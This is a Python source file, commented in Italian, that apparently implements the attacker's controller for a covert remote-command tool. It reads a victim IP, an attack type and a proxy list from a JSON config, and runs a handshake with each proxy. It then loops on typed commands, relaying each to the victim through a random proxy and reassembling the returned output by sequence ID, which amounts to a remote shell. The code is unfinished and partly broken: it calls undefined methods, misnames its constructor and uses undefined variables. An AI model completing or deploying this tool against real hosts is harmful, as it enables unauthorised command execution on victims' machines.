#from scapy.all import * 
from scapy.all import IP, ICMP, Raw 

import datetime 
import time
import ipaddress
import sys 
import os 
import argparse 
import re 
import random
import threading
from functools import partial 
import json 
import socket 

from mymethods import * 

from scapy.all import * 

#file_path = "./attacksingleton.py"
#directory = os.path.dirname(file_path)
#sys.path.insert(0, directory)
#import attacksingleton 
from attacksingleton import * 

class Methods_Analyze_Data:
    def separa_dati_byID(received_data:dict[str,list]):
        dati_separati:dict[str,list]=[]
        unindent_data=[]
        ## dati_separati={id:lista}
        for list_data in received_data.values(): 
            if isinstance(list_data, bytes):
                    list_data=list_data.decode()
            else: print(type(data))
            for data in list_data.split("||"): 
                unindent_data.append([x for x in data])
        #print("unindent_data: ",unindent_data)    
        for list_data in unindent_data:
            #print("list_data: ",list_data)
            #print(f"\t***{list_data}")
            if isinstance(list_data, bytes):
                    list_data=list_data.decode()
            else: print(type(data))
            list_data=list_data.split("&&")
            if len(list_data)!=2:
                print(f"Errore. Length is {len(list_data)}\t{list_data}")
                continue
            if dati_separati.get(list_data[0]) is None:
                dati_separati.update({list_data[0]:[]}) 
            dati_separati.get(list_data[0]).append(list_data[1]) 
        return dati_separati

    def old_separa_dati_byID(received_data:dict[str,list], dati_separati:dict[str,list]):
        unindent_data=[]
        ## dati_separati={id:lista}
        for list_data in received_data.values():
            for data in list_data:
                if isinstance(data, bytes):
                    data=data.decode()
                if isinstance(data, str):
                    data=data.split("||")
                else: print(type(data))
                #print("Separa: ",data) 
                unindent_data.append([x for x in data])
        #print("unindent_data: ",unindent_data)    
        for list_data in unindent_data:
            #print("list_data: ",list_data)
            #print(f"\t***{list_data}")
            for index in range(len(list_data)):
                #print(f"AAAA: {index}/{len(list_data)}")
                if not list_data[index]: 
                    continue
                #print(f"\t***{list_data[index]}") 
                if isinstance(list_data[index],bytes):
                    data=list_data[index].decode()
                if isinstance(list_data[index],str): 
                    data=list_data[index].split("\t")
                #print("***DATA: ",data) 
                if dati_separati.get(data[1]) is None:
                    dati_separati.update({data[1]:[]}) 
                dati_separati.get(data[1]).append(data)   

    def unisciDati(dati_separati:dict[str:list]):
        payload=[] 
        for index in range(len(dati_separati)): 
            #print("DATI: ",dati_separati.get(str(index))) 
            for data in dati_separati.get(str(index)):
                if data[2]==MSG.LAST_PACKET:
                    continue
                payload.append(data[2])
        return payload

class Proxy_Data: 
    def __init__(self, proxy:ipaddress._IPAddressBase): 
        if not IS_TYPE.ipaddress(proxy): 
            raise TypeError("proxy non valido") 
        self.ipaddress:ipaddress.IPv4Address=proxy 
        self.socket:socket.socket=None 
        self.thread:threading.Thread=None  
        self.event:threading.Event=GET.threading_Event() 
        self.received_data:list[str]=[] 

class Connected_Proxy: 
    def __init__(self,proxy_list:list[ipaddress._IPAddressBase]):  
        if not IS_TYPE.list(proxy_list) or len(proxy_list)<=0: 
            raise TypeError("proxy_list non valida") 
        self.lock_connected_proxy:threading.Lock=GET.threading_Lock() 
        self.connected_proxy:dict[str,Proxy_Data]=dict() 
        for proxy in proxy_list:
            if not IS_TYPE.ipaddress(proxy): 
                #proxy_list.remove(proxy) 
                print(f"***\t{proxy} non è un indirizzo valido")
                continue   
            if self.connected_proxy.get(proxy.compressed) is None:  
                self.connected_proxy[proxy.compressed]=Proxy_Data(proxy)
            else: 
                print(f"Proxy {proxy} già presente")
    
    def conn_2_proxy(self, ip_vittima:ipaddress._IPAddressBase,attack_function:AttackType): 
        def init_socket(proxy:ipaddress._IPAddressBase): 
            socket_proxy=None 
            socket_proxy=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket_proxy.settimeout(15) #15 secondi 
            socket_proxy.connect((proxy.compressed, proxy_port)) 
            #socket_proxy.connect(("192.168.56.104", 4567)) 
            #print("SOCKET",socket_proxy) 
            with self.lock_connected_proxy:
                self.connected_proxy[proxy.compressed].socket=socket_proxy 
        def send_conferma(proxy:ipaddress._IPAddressBase,socket_proxy:socket.socket=None): 
            confirm_msg=( 
                MSG.CONFIRM_ATTACKER+"|"+ 
                proxy.compressed+"|"+
                ip_vittima.compressed+"|"+ 
                MSG.ATTACK_FUNCTION+"|"+
                attack_function.name 
            ) 
            #TODO implementare metodi per riprovare in caso di fallimento
            socket_proxy.settimeout(10) 
            socket_proxy.sendall(confirm_msg.encode()) 
            print(f"Messaggio di conferma inviato a {proxy}") 
            socket_proxy.settimeout(10) 
            data=socket_proxy.recv(1024).decode() 
            #print(f"Received from {proxy}:{data}") 
            confirm_msg=( 
                MSG.CONFIRM_PROXY+"|"+ 
                proxy.compressed+"|"+
                ip_vittima.compressed+"|"+ 
                MSG.ATTACK_FUNCTION+"|"+
                attack_function.name 
            ) 
            if not data or data!=confirm_msg:  
                raise ValueError(f"Messaggio di conferma non valido per {proxy}") 
        def wait_update(proxy:ipaddress._IPAddressBase,socket_proxy:socket.socket=None): 
            confirm_text=( 
                MSG.CONFIRM_VICTIM+"|"+ 
                ip_vittima.compressed+"|"+ 
                proxy.compressed 
            ) 
            socket_proxy.settimeout(10) 
            data_received=socket_proxy.recv(1024).decode() 
            result=data_received.replace(confirm_text,"") 
            #print(f"{proxy} è connesso alla vittima? {type(result)} {result}") 
            if result!="True": 
                raise ValueError(f"Proxy {proxy} non connesso alla vittima") 
        def callback(proxy:ipaddress._IPAddressBase=None):  
            try: 
                init_socket(proxy) 
                print(f"Connessione con {proxy} stabilita") 
                with self.lock_connected_proxy:
                    proxy_data=self.connected_proxy.get(proxy.compressed)
                if not proxy_data or not proxy_data.socket or not IS_TYPE.socket(proxy_data.socket): 
                    raise ValueError(f"Proxy {proxy} non presente o socket non inizializzato")
                socket_proxy=proxy_data.socket  
                send_conferma(proxy,socket_proxy) 
                print(f"Messaggio di conferma valido per {proxy}")
                wait_update(proxy,socket_proxy) 
                print(f"Proxy {proxy} connesso alla vittima") 
            except Exception as e: 
                print(f"conn_2_proxy.callback: {e}") 
                print(f"Connessione con {proxy} fallita") 
                with self.lock_connected_proxy: 
                    unusable_proxy.append(proxy) 
        #----------------------- 
        unusable_proxy=[] 
        for proxy in self.connected_proxy.values():  
            with self.lock_connected_proxy:
                proxy.thread=threading.Thread( 
                    #La callback controlla la connesisone fra l'attaccante ed il proxy
                    target=callback 
                    ,args=[proxy.ipaddress] 
                )   
            proxy.thread.start() 
        for proxy in self.connected_proxy.values(): 
            proxy.thread.join() 
        for unusable in unusable_proxy: 
            print("Chiusura connessione con proxy inutilizzabile: ",unusable)
            with self.lock_connected_proxy: 
                if self.connected_proxy[unusable.compressed].socket: 
                    try: 
                        self.connected_proxy[unusable.compressed].socket.sendall(MSG.END_COMMUNICATION.encode()) 
                        self.connected_proxy[unusable.compressed].socket.close() 
                    except Exception as e: 
                        print("conn_2_proxy-> ",e)
                        print(f"Errore durante la chiusura della connessione con proxy {unusable}") 
            with self.lock_connected_proxy: 
                if self.connected_proxy.get(unusable.compressed):
                    self.connected_proxy.pop(unusable.compressed)
            print(f"Rimosso proxy inutilizzabile: {unusable}") 
#-----------------------------------------  
def load_config_file(path_of_file): 
    if not os.path.exists(path_of_file): 
        raise FileNotFoundError(f"File {path_of_file} non presente")
    if not str(path_of_file).endswith(".json"): 
        raise TypeError(f"File {path_of_file} non JSON file") 
    with open(path_of_file, 'r') as file: 
        print(f"File di configurazione {path_of_file} caricato correttamente") 
        return json.load(file) 

class Get_Command_Args: 
    def init__(self, oggetto=None): 
        def _attaccante(): 
            parser = argparse.ArgumentParser()
            parser.add_argument("--file_path",type=str, help="File di configurazione")  
            try: 
                args,unknown =PARSER.check_arguments(parser) 
                if not IS_TYPE.namespace(args) or not IS_TYPE.list(unknown) or len(unknown)>0:  
                    raise ValueError(f"Argomenti sconosciuti: {unknown}") 
                if not args.file_path or not IS_TYPE.string(args.file_path): 
                    print(f"--file_path non specificato") 
                    return None 
                return args 
            except Exception as e: 
                print(e) 
                PARSER.print_supported_arguments(parser) 
        def _proxy(): 
            parser = argparse.ArgumentParser()
            parser.add_argument("--ip_attaccante",type=str, help="IP dell'attaccante") 
            try:
                args,unknown =PARSER.check_arguments(parser) 
                if not IS_TYPE.namespace(args) or not IS_TYPE.list(unknown) or len(unknown)>0:  
                    raise ValueError(f"Argomenti sconosciuti: {unknown}") 
                if not args.ip_attaccante or not IS_TYPE.string(args.ip_attaccante): 
                    print(f"--ip_attaccante non specificato") 
                    return None
                return args 
            except Exception as e: 
                print(e)
                PARSER.print_supported_arguments(parser) 
        def _victim(): 
            parser = argparse.ArgumentParser()
            parser.add_argument("--num_proxy",type=int, help="Numero dei proxy necessari")
            try:
                args,unknown =PARSER.check_arguments(parser) 
                if not IS_TYPE.namespace(args) or not IS_TYPE.list(unknown) or len(unknown)>0:  
                    raise ValueError(f"Argomenti sconosciuti: {unknown}") 
                if not args.num_proxy or not IS_TYPE.integer(args.num_proxy): 
                    print(f"--num_proxy non specificato") 
                    return None
                return args 
            except Exception as e: 
                print(e)
                PARSER.print_supported_arguments(parser) 
        #------------------------------
        if not isinstance(oggetto,Attacker): #TODO Aggiungere or not isinstance(oggetto,Proxy) or not isinstance(oggetto,Victim):
            raise TypeError(f"Oggetto {oggetto} non valido")
        self.oggetto=oggetto 
        if isinstance(self.oggetto,Attacker): 
            self.args=_attaccante()
        #elif isinstance(self.oggetto,Proxy): 
        #    self.args=_proxy()
        #elif isinstance(self.oggetto,Victim): 
        #    self.args=_victim()  
        return None 

class MSG_CONFIG(Enum): 
    attack_method="attack_function" 
    proxy_list="proxy_list"

class ICMP_THREAD: 
    thread_lock=None 
    thread_response={} 
    thread_list={} 

    def __init__(self, proxy_list:list[ipaddress._IPAddressBase], callback_function):  
        if not IS_TYPE.list(proxy_list) or len(proxy_list)<=0: 
            raise TypeError("proxy_list non valida") 
        if any(not IS_TYPE.ipaddress(ip) for ip in proxy_list): 
            raise ValueError("proxy_list non valida") 
        if not IS_TYPE.callable_function(callback_function): 
            raise TypeError("callback_function not callable")
        self.thread_lock=GET.threading_Lock() 
        for proxy in proxy_list: 
            if not IS_TYPE.ipaddress(proxy): 
                print(f"***\t{proxy} non è un indirizzo valido")
                continue 
            thread=threading.Thread(
                target=callback_function, 
                args=[proxy]
            ) 
            thread.name=f"Thread-{proxy.compressed}" 
            self.thread_list[proxy.compressed]=thread 
            self.thread_response[proxy.compressed]=False 
        print("Definito il dizionario dei thread") 
        print("Definiti il dizionario delle risposte") 
    
    def reset(self): 
        if not IS_TYPE.dictionary(self.thread_list) or len(self.thread_list)<=0: 
            raise TypeError("thread_list non valido")  
        for thread in self.thread_list.values():
            thread.clear() 
        print("Thread ICMP reimpostati") 

    def start(self): 
        if not IS_TYPE.dictionary(self.thread_list) or len(self.thread_list)<=0: 
            raise TypeError("thread_list non valido")  
        self.reset()
        for thread in self.thread_list.values():
            thread.start() 
        print("Thread ICMP avviati")
    
    def wait(self):  
        if not IS_TYPE.dictionary(self.thread_list) or len(self.thread_list)<=0: 
            raise TypeError("thread_list non valido")  
        for thread in self.thread_list.values():
            #thread.wait()  
            thread.join()  
        print("Thread ICMP terminati")
#-----------------------------------------  
default_file_path:str = "./attack_file.json" 
proxy_port=4567 

class Attacker: 
    dati_separati={} 
    connected_proxy:Connected_Proxy=None 

    attack_type:AttackType=None
    ip_vittima:ipaddress._IPAddressBase=None
    ip_host:ipaddress._IPAddressBase=None
    
    def __init__(self): 
        def get_attacco(): 
            attack_type=AttackType.get_attack_method(config_file.get("attack_function"))
            if not IS_TYPE.enum(attack_type,AttackType): 
                #raise TypeError("attack_type non valido") 
                attack_type=AttackType.choose_attack_function()  
            if not IS_TYPE.enum(attack_type, AttackType): 
                raise TypeError("Attacco non valido:",attack_type) 
            return attack_type 
        def get_vittima(): 
            ip_vittima=ipaddress.ip_address(config_file.get("ip_vittima", None)) 
            return ip_vittima 
        def get_ip_host(): 
            ip_host, errore=NETWORK.IP.find_local_IP() 
            if errore:
                print("errore:",errore)  
                msg="Inserire indirizzo IP dell'host:\n\t#" 
                ip_host=input(msg) 
            #self.ip_host=ipaddress.ip_address("192.168.56.104") #TODO eliminare alla fine
            ip_host=ipaddress.ip_address(ip_host) 
            return ip_host
        def get_proxy_list():  
            proxy_list:list[ipaddress._IPAddressBase]=[]
            for ip_proxy in config_file.get("proxy_list", []): 
                try:
                    proxy_ip=ipaddress.ip_address(ip_proxy)
                    proxy_list.append(proxy_ip)  
                except ValueError as e:
                    print(f"get_proxy_list: {e}") 
            if len(proxy_list)<=0: 
                raise ValueError("Lista proxy vuota:",proxy_list) 
            if any(not IS_TYPE.ipaddress(proxy) for proxy in  proxy_list): 
                raise ValueError("Uno o più IP Proxy non validi:",proxy_list) 
            print(f"Lista proxy sanificata") 
            return proxy_list 
        #--------------------------
        args=Get_Command_Args().args   
        if not IS_TYPE.namespace(args): 
            exit(-1) 
        try: 
            config_file=load_config_file(args.file_path) 
        except Exception as e: 
            print(e) 
            config_file=load_config_file(default_file_path) 
        self.attack_type=get_attacco() 
        print("Attacco selezionato:", self.attack_type) 
        self.ip_vittima=get_vittima() 
        print(f"IP vittima: {type(self.ip_vittima) } {self.ip_vittima }")
        self.ip_host=get_ip_host() #prima era None
        #while not IS_TYPE.ipaddress(self.ip_host): 
        #    self.ip_host=get_ip_host() 
        print(f"ip_host: {type(self.ip_host)} {self.ip_host}") 
        self.connected_proxy=Connected_Proxy(get_proxy_list()) 
        print(f"Got all connected proxy") 
        if len(self.connected_proxy.proxy_list)<=0: 
            print("Nessun Proxy disponibile")
            exit(0) 
        #--------------------
        self.connected_proxy.connect2proxies(self.ip_vittima,self.attack_type)
        self.connected_proxy.start() 
        self.connected_proxy.wait() 
        #thread_list=connected_proxy.Proxy_Thread
        #dict_proxy_socket=connected_proxy.Proxy_Socket 
    
    def send_command_to_victim(self): 
        self.data_lock=GET.threading_Lock() 
        self.icmp_thread=ICMP_THREAD(self.connected_proxy.proxy_list, self.wait_proxy_update) #thread_lock, thread_proxy_response, thread_list
        self.event_received_data=GET.threading_Event() 
        self.icmp_thread.start_Thread() 
        msg=f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> "
        command=input(msg) 
        while command.lower() not in exit_cases: 
            print(f"Il comando immesso è: {command}")
            try:
                chosen_proxy=random.choice(self.proxy_list)
                #print(f"Il proxy scelto è: {chosen_proxy}")
            except Exception as e:
                print(f"send_command_to_victim: {e}") 
                continue
            print(f"Il comando {command} verrà mandato al proxy {chosen_proxy}") 
            socket= self.connected_proxy.Proxy_Socket.get(chosen_proxy.compressed)
            data=(MSG.CONFIRM_COMMAND+command)
            socket.sendall(data.encode())
            print(f"Gli altri proxy ascolteranno direttamente la vititma")
            for proxy in self.connected_proxy.proxy_list:
                if proxy!=chosen_proxy :
                    socket= self.connected_proxy.Proxy_Socket.get(proxy.compressed)
                    socket.sendall(MSG.WAIT_DATA.encode()) 
            self.icmp_thread.wait_Thread() 
            print("Separazione dati per SEQ") 
            try:
                print("ABCDEFG: ",self.received_data)
                self.dati_separati= Methods_Analyze_Data.separa_dati_byID(self.received_data) 
                print("ABCDEFG: ",self.dati_separati)
            except Exception as e:
                print(f"send_command_to_victim separa: {e}")
            #print("\n***dati_separati: ", self.dati_separati) 
            print("Dati separati per Sequenza")   
            try:
                payload=Methods_Analyze_Data.unisciDati(self.dati_separati)
                print(payload)
            except Exception as e:
                print("aiuto eccezzione: ",e) 
            
            #reset thread and reset received_data
            self.reset_variables()
            command=input(msg) 
        print("Uscita dalla shell\texit")  
        for proxy in self.proxy_list:
            socket_proxy=self.dict_proxy_socket.get(proxy.compressed)
            socket_proxy.sendall(MSG.END_COMMUNICATION.encode()) 
            socket_proxy.close()

    def wait_data_from_proxy(self,proxy:ipaddress.IPv4Address|ipaddress.IPv6Address):  
        print("wait_data_from_proxy")
        self.data_lock.acquire()
        proxy_data=self.received_data.get(proxy.compressed)
        self.data_lock.release() 
        proxy_socket=self.dict_proxy_socket.get(proxy.compressed) 
        while(data:=proxy_socket.recv(1024)):  
            #print("proxy_data: ",proxy_data)
            self.data_lock.acquire() 
            proxy_data.append(data) 
            self.data_lock.release()
            print(f"Received from proxy: {proxy_data}")
            if MSG.LAST_PACKET.encode() in data:
                break
        print("Received all data") 
        return 
    
    def reset_variables(self): 
        self.thread_list={}
        self.dati_separati={}
        self.received_data:dict[str,list]={}
        for proxy in self.proxy_list: 
            if not isinstance(proxy, ipaddress.IPv4Address) and not isinstance(proxy, ipaddress.IPv6Address):
                print(f"***\t{proxy} non è un indirizzo valido")
                continue
            self.received_data.update({proxy.compressed:[]}) 
            thread=threading.Thread(
                target=self.wait_data_from_proxy 
                ,args=[proxy]
            )
            thread.name=f"Thread-{proxy.compressed}"
            self.thread_list.update({proxy.compressed:thread})
        for proxy in self.proxy_list:
            self.event_thread_update.get(proxy.compressed).clear() 
        for thread in self.thread_list.values():
            thread.start() 
        #if want_to_choose_new_attack():
        #    self.attack_function=choose_new_attack() 
        #if want_to_choose_new_victim:
        #   self.ip_vittima= choose_new_victim()  

if __name__=="__main__": 
    attacker=Attacker() 
    attacker.send_command_to_victim()
